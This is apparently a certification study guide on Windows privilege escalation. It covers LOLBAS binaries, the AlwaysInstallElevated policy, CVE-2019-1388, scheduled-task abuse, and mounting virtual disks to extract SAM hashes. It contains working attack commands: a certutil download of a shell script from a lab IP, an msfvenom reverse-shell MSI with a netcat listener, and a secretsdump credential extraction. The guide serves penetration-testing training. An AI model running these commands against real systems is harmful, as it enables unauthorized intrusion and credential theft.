This section is essentially a **“don’t stop enumerating just because the obvious privilege-escalation paths are exhausted”** chapter. It covers LOLBAS, misconfigured Windows Installer policies, a historical UAC-related vulnerability, scheduled tasks, description fields, and virtual-disk hunting.

---

## 1. Living Off The Land Binaries and Scripts — LOLBAS

![Image](https://images.openai.com/static-rsc-4/jw-2JgT8G30pU_-q6_FsumJZZma9J6fJ-y3a50kQauz_N5jcwBuid6_rFwY2TgllhbXPmLZXYjdD4OTpbJdd6DScrxc-lT5-O4wr8HOuJ-zmAYLq7f7c92KgdEKB0uh0Ptij23vk1baKFJdy0SP1Pq7hEIBgeJ_nipOAQ3Dl_ribU0SIU9GNjbHil9gRisNo?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/-cxLKdtt0DdJEl73zzgDamH2LP2YgIank1XHJ271smBVfv9NMTRWaLVj8Nu0-hBR3TNmK5o38Un9_6bZMiBDJJHSG0ASfYRhL1FBQl2CgqyiccMAbtN1T6TaY_ONdl6SgqbJrAt66a7Lmu1My92yZ6SXnvcTgfgtY8QuCf-PIcmuppsFUBiILKPm6IMxJ87b?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/NfiS-iKdglaYNAy_SsYSuYr0nnQXbTv2ZdDb7ImE5cFuE6J6iJZErYhM2LS7gshqp-PKinblipFg6xBpeIHQ96qk45s8lsZII_rk39wJ2Z2pPwS-QQ_i4X5DEvAp0HDQGQig5Q4ZyXspujOhR7cNZ_HmPfZbRKSznfrhnLryD18q398Sj1rIbwzBE5Xxxaqy?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/nBKLudR7DAbtrOTCxDBpM1Z2g0CleoEWOUJAZ26hGlmCdHQqxJ6h4PisrOck78sALoK45iGoI4F_56cT76i16TZd73d0BCShHFaTR5mbCnGLhxe3LaGXDtxp-aYMoO0yFfberowe_8Cvz_erfoc5NYsDc1buoCfdJ_MXGxH-UcrKo5YADw4sei-Yf69O3yCX?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Fp7ej-T0KF7FGI6LP3MGTQcsSayDKfnWHJIGMGSTi5pXqTB8fc5J1boGMKZpkxsMDaC4MQVWBq-v32ZTdPHuWd_Wtl6MHZjQCVqtogKVztajouwVbgjZbJCRAvstIYZVJPSQNEkrFfreOX-1FPAY3CfDpujvnQCfTTjKFHYF7cDr8aBfJRhu_cftEZmwm18S?purpose=fullsize)

### What is LOLBAS?

**LOLBAS = Living Off The Land Binaries and Scripts**

The LOLBAS project documents Microsoft-signed Windows binaries, scripts, and libraries that have legitimate functionality but can also be abused for offensive purposes. The source highlights capabilities such as:

- Code execution
    
- Code compilation
    
- File transfers
    
- Persistence
    
- UAC bypass
    
- Credential theft
    
- Process-memory dumping
    
- Keylogging
    
- Evasion
    
- DLL hijacking
    

### CPTS mental model

Don't always think:

> “I need to upload my own tool.”

Instead think:

> **“What trusted Windows binary already exists on this machine that can perform the operation I need?”**

This can matter when:

- AV/EDR monitors unusual tools.
    
- You have limited ability to upload binaries.
    
- You are restricted to a managed Windows workstation.
    
- You need to transfer or execute something using native functionality.
    

---

# 2. `certutil.exe`

`certutil.exe` is intended for certificate management, but it also provides functionality useful for file transfer and encoding/decoding.

## Download a file

```cmd
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

### Breakdown

```text
certutil.exe
     │
     ├── -urlcache
     ├── -split
     ├── -f
     │
     └── URL → output file
```

---

## Encode a file

```cmd
certutil -encode file1 encodedfile
```

The source demonstrates that the resulting file contains the Base64-encoded representation of the original.

## Decode it

```cmd
certutil -decode encodedfile file2
```

This reconstructs the original file.

### CPTS takeaway

Remember:

```text
certutil
 ├── Download
 ├── Encode
 └── Decode
```

---

# 3. `rundll32.exe`

Another LOLBAS example is:

```cmd
rundll32.exe
```

It can execute DLL files. The source notes that a DLL can either be downloaded onto the target or hosted through an SMB share and then executed using `rundll32.exe`.

### Important distinction

You should recognize the difference between:

**DLL injection**

```text
Existing process
      ↓
Inject DLL
      ↓
Code executes inside process
```

and:

**rundll32 execution**

```text
rundll32.exe
      ↓
Load DLL
      ↓
Execute exported DLL function
```

---

# 4. Always Install Elevated

This is a **Windows Installer misconfiguration** that can result in privilege escalation.

The relevant Group Policy setting is:

> **Always install with elevated privileges**

It can be configured under both:

```text
Computer Configuration
└── Administrative Templates
    └── Windows Components
        └── Windows Installer
```

and:

```text
User Configuration
└── Administrative Templates
    └── Windows Components
        └── Windows Installer
```

---

## 4.1 Enumerating the setting

You need to check **both** registry locations.

### HKCU

```cmd
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

Look for:

```text
AlwaysInstallElevated    REG_DWORD    0x1
```

### HKLM

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Again:

```text
AlwaysInstallElevated    REG_DWORD    0x1
```

The source demonstrates both values being `0x1`.

### ⭐ CPTS MUST KNOW

Don't check only one registry location.

Think:

```text
HKCU → AlwaysInstallElevated = 1
                    +
HKLM → AlwaysInstallElevated = 1
                    ↓
             Misconfiguration
                    ↓
              Malicious MSI
                    ↓
                 SYSTEM
```

---

# 5. Generating a Malicious MSI

The source uses:

```bash
msfvenom -p windows/shell_reverse_tcp \
lhost=10.10.14.3 \
lport=9443 \
-f msi > aie.msi
```

This creates an MSI payload.

Then transfer the MSI to the target.

---

## Execute the MSI

```cmd
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

Listener:

```bash
nc -lnvp 9443
```

The lab demonstrates the resulting shell running as:

```text
NT AUTHORITY\SYSTEM
```

### Attack chain

```text
Low-privileged user
       │
       ▼
Check AlwaysInstallElevated
       │
       ├── HKCU = 1
       └── HKLM = 1
       │
       ▼
Create malicious MSI
       │
       ▼
msiexec
       │
       ▼
SYSTEM
```

### Mitigation

The source states that disabling the two Local Group Policy settings mitigates this issue.

---

# 6. CVE-2019-1388

**CVE-2019-1388** was a Windows Certificate Dialog privilege-escalation vulnerability related to the UAC mechanism.

The vulnerability involved a certificate containing the relevant:

```text
SpcSpAgencyInfo
```

field, which could cause an `Issued By` hyperlink to appear in the certificate dialog.

The HTB example uses:

```text
hhupd.exe
```

an old Microsoft-signed executable.

---

## Exploit flow from the lab

```text
Run hhupd.exe as administrator
          ↓
Certificate information
          ↓
Certificate dialog
          ↓
"Issued By" hyperlink
          ↓
Browser launched as SYSTEM
          ↓
View page source
          ↓
Save As
          ↓
Enter cmd.exe path
          ↓
SYSTEM cmd.exe
```

The source demonstrates the browser running as `NT AUTHORITY\SYSTEM`, followed by using the browser's **View page source → Save as** workflow to launch `cmd.exe`.

### Important

This is a **historical vulnerability**.

Microsoft released a patch in **November 2019**, but the source emphasizes checking for it when you have GUI access to a potentially vulnerable system.

### CPTS lesson

For old Windows environments:

```text
GUI access
   +
Old Windows build
   +
Unpatched vulnerability
   ↓
Check historical local privilege-escalation techniques
```

Don't blindly run an exploit. First establish:

- Windows version/build
    
- Patch level
    
- Whether the vulnerability applies
    
- Whether the engagement permits exploitation
    

---

# 7. Scheduled Tasks

Scheduled Tasks are extremely important for Windows privilege escalation.

Why?

A task may execute:

- As SYSTEM
    
- As Administrator
    
- Under another privileged account
    

If the **task configuration, executable, script, or containing directory is writable by your user**, you may have a privilege-escalation path.

---

## 7.1 Enumerate with `schtasks`

```cmd
schtasks /query /fo LIST /v
```

This provides verbose information about scheduled tasks.

Pay particular attention to:

```text
TaskName
Run As User
Task To Run
Status
Scheduled Task State
Last Run Time
Next Run Time
```

### Example

The source shows:

```text
TaskName: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Run As User: SYSTEM
```

---

# 8. PowerShell Scheduled Task Enumeration

You can also use:

```powershell
Get-ScheduledTask | select TaskName,State
```

Example:

```text
TaskName                              State
--------                              -----
.NET Framework NGEN v4.0.30319       Ready
.NET Framework NGEN v4.0.30319 64    Ready
...
```

---

# 9. Scheduled Task Permission Hunting

This is where things get interesting.

Standard users generally cannot see every task created by other users because scheduled-task files are stored under:

```text
C:\Windows\System32\Tasks
```

and standard users normally don't have read access to those files.

But misconfigurations happen.

For example:

```text
Privileged scheduled task
        ↓
Runs as SYSTEM
        ↓
Calls C:\Scripts\backup.ps1
        ↓
BUILTIN\Users can modify backup.ps1
        ↓
User modifies script
        ↓
Task executes
        ↓
SYSTEM
```

This is an important CPTS pattern.

---

# 10. Writable Script Directory — Very Important

The source gives a realistic penetration-testing scenario.

A directory:

```text
C:\Scripts\
```

is discovered to be writable.

Check permissions:

```cmd
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```

Output:

```text
C:\Scripts
    RW BUILTIN\Users
    RW NT AUTHORITY\SYSTEM
    RW BUILTIN\Administrators
```

Inside are scripts such as:

```text
db-backup.ps1
mailbox-backup.ps1
```

and these scripts are also writable by:

```text
BUILTIN\Users
```

---

## The vulnerability chain

```text
Writable C:\Scripts
       │
       ▼
Writable privileged script
       │
       ▼
Determine execution frequency
       │
       ▼
Script executes as privileged account
       │
       ▼
Modified code executes
       │
       ▼
SYSTEM / Administrator
```

The source's example assumes a backup script executes overnight and the appended code results in a SYSTEM beacon the following morning.

### ⭐ CPTS MUST-KNOW

Don't only inspect:

```text
Task permissions
```

Also inspect the **entire execution chain**:

```text
Scheduled Task
      ↓
Executable / Script
      ↓
Parent Directory
      ↓
Referenced Files
      ↓
DLLs / Configs
```

Any writable link in that chain can become interesting.

---

# 11. User / Computer Description Fields

This is a simple technique but easy to overlook.

Administrators sometimes put useful information in account descriptions, potentially including credentials.

## Local users

```powershell
Get-LocalUser
```

Example:

```text
Name          Enabled    Description
----          -------    -----------
Administrator True       Built-in account...
helpdesk      True
secsvc        True       Network scanner - do not change password
sql_dev       True
```

### Why this matters

The description:

```text
Network scanner - do not change password
```

doesn't necessarily give you a password, but it immediately tells you:

> **This account may have an important operational role.**

So don't just search descriptions for the word `password`.

Look for:

- Service information
    
- Roles
    
- Hostnames
    
- Application names
    
- Operational notes
    
- Credential hints
    

---

# 12. Computer Description

PowerShell:

```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

Example:

```text
Description
-----------
The most vulnerable box ever!
```

Obviously, real environments may contain more useful information.

---

# 13. Mount VHD / VHDX / VMDK

This is one of the **most important concepts in this section**.

During enumeration you may discover:

```text
.vhd
.vhdx
.vmdk
```

These can contain entire operating-system filesystems. The source identifies:

|Extension|Technology|
|---|---|
|`.vhd`|Hyper-V Virtual Hard Disk|
|`.vhdx`|Hyper-V Virtual Hard Disk v2|
|`.vmdk`|VMware Virtual Machine Disk|

---

## Why are they valuable?

Imagine:

```text
Web server
   │
   └── Access to backup share
             │
             ├── WEB01.vhdx
             ├── SQL01.vmdk
             └── DC01.vhdx
```

You may not be able to compromise:

```text
DC01
```

directly.

But if you obtain:

```text
DC01.vhdx
```

you may be able to inspect the operating system offline.

The source specifically highlights a scenario where a virtual disk corresponds to a host containing an active Domain Admin session, making the disk highly valuable.

---

# 14. Mount VMDK on Linux

```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

### Important flag

```text
--ro
```

means:

> Read-only

For assessment work, read-only access is generally preferable when you only need to inspect evidence.

---

# 15. Mount VHD / VHDX on Linux

```bash
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

---

# 16. Mount VHD/VHDX on Windows

Windows can mount VHD/VHDX through:

- Right-click → **Mount**
    
- Disk Management
    
- PowerShell `Mount-VHD`
    

Once mounted, the virtual disk appears as a drive letter and can be browsed.

---

# 17. VMDK on Windows

For VMDK, the source mentions:

- **Map Virtual Disk**
    
- VMware Workstation → **File → Map Virtual Disks**
    
- Add the VMDK as an additional virtual hard disk
    
- 7-Zip can also extract data from some VMDK files
    

---

# 18. Extracting Windows Hashes from a Virtual Disk

Once you have access to the Windows filesystem, one particularly valuable location is:

```text
C:\Windows\System32\Config\
```

Important registry hives include:

```text
SAM
SECURITY
SYSTEM
```

The source explains that these can be extracted from a backup and processed with `secretsdump`.

Example:

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

The output can contain local account NTLM hashes, such as:

```text
Administrator:500:LMHASH:NTHASH:::
```

---

# 🔥 The Big CPTS Mental Model

This whole section teaches you to think beyond the standard:

```text
whoami
systeminfo
whoami /priv
services
ACLs
```

Instead:

```text
                 FOOTHOLD
                    │
                    ▼
             ENUMERATE EVERYTHING
                    │
       ┌────────────┼────────────┐
       ▼            ▼            ▼
    LOLBAS       Policies     Scheduled Tasks
       │            │            │
       ▼            ▼            ▼
   Trusted       Installer    Writable
   binaries      settings     scripts
       │            │            │
       └────────────┼────────────┘
                    ▼
              PRIVILEGE PATH
                    │
                    ▼
             SYSTEM / ADMIN
                    │
                    ▼
             Pillage further
                    │
       ┌────────────┼────────────┐
       ▼            ▼            ▼
    Accounts      Backups     VHD/VHDX/VMDK
                                  │
                                  ▼
                         Offline filesystem
                                  │
                                  ▼
                            SAM/SYSTEM
                                  │
                                  ▼
                              Hashes
```

---

# 🧠 CPTS Must-Know Checklist

When you get a Windows foothold, add these to your enumeration checklist:

### LOLBAS

```text
certutil.exe
rundll32.exe
```

Think:

> Can a legitimate Microsoft binary perform what I need?

### Installer policy

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Look for:

```text
AlwaysInstallElevated = 1
```

**Both locations matter.**

### Scheduled tasks

```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask | select TaskName,State
```

Then investigate:

```text
Who runs it?
What does it execute?
Where is the executable/script?
Can I modify it?
Can I modify its parent directory?
```

### Writable script directories

```cmd
accesschk64.exe /accepteula -s -d C:\Scripts\
```

### Account descriptions

```powershell
Get-LocalUser
```

### Computer description

```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

### Virtual disks

Search for:

```text
*.vhd
*.vhdx
*.vmdk
```

Then consider:

```bash
guestmount
```

and offline Windows filesystem analysis.

### Registry hives

```text
SAM
SECURITY
SYSTEM
```

Then, where authorized:

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

---

# 🎯 Viva / Interview Questions

### 1. What is LOLBAS?

**LOLBAS is a project documenting Microsoft-signed Windows binaries, scripts, and libraries that have legitimate functionality but can also be abused for offensive purposes.**

### 2. Why is `certutil.exe` interesting?

Because besides certificate operations, it can be used for file downloading and Base64 encoding/decoding.

### 3. What is `AlwaysInstallElevated`?

A Windows Installer policy that, when improperly enabled in the relevant HKCU and HKLM policy locations, can allow MSI packages to be installed with elevated privileges.

### 4. Which two registry locations should you check?

```text
HKCU\Software\Policies\Microsoft\Windows\Installer
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

### 5. What should you inspect when finding a scheduled task?

```text
Run-as account
Executable/script
Arguments
File permissions
Directory permissions
Execution frequency
```

### 6. Why are writable scheduled-task scripts dangerous?

Because a privileged task may execute the modified script under a higher-privileged account.

### 7. Why inspect account descriptions?

Administrators sometimes store operational information or credential-related details there.

### 8. What are VHDX and VMDK?

Virtual disk formats containing filesystems from virtual machines.

### 9. Why are virtual disks interesting during a pentest?

They can provide offline access to an entire operating system and potentially sensitive files, credentials, registry hives, and other data.

### 10. What are the three important Windows registry hives mentioned for offline credential extraction?

```text
SAM
SECURITY
SYSTEM
```

### 11. What does this command do?

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

It processes the Windows registry hives offline to extract local account password hashes and other credential material supported by the supplied hives.

---

## ⚡ One-Line Memory Trick

> **LOLBAS → Policies → Tasks → Writable Scripts → Descriptions → Virtual Disks → Offline Hives → Credentials**

That is the enumeration mindset this section is trying to build: **when the obvious privesc paths are exhausted, keep looking for indirect execution paths, forgotten configuration, and offline data sources.**